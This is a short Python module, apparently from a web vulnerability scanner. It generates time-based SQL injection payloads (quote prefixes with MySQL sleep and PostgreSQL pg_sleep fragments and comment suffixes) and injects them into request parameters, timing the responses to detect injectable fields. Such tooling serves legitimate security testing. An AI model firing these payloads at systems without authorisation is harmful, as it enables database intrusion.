import re, itertools, time
from utils.requester import *
from threading import Thread, Semaphore
from config import *


tech = "Time Based SQL Injection"
prefixs = ("'", "\"", "")
sleeps   = (" AND (SELECT sleep(%d))", " ||pg_sleep(%d)")
suffixs = ("-- -", "#")
payloads = []
for pre, sleep, suf in itertools.product(prefixs, sleeps, suffixs):
    payloads.append(f"{pre}{sleep}{suf}" % SLEEP)

def exec(data):
    for pos, payload in itertools.product(POSITIONS, payloads):
        for parameter in data[pos].keys():
            t1 = time.time()
            r = single_request(data, pos, parameter, payload)
            if (time.time() - t1) > SLEEP:
                print(f"■■■{tech}■■■{pos}■■■{parameter}■■■{payload}■■■")
                return True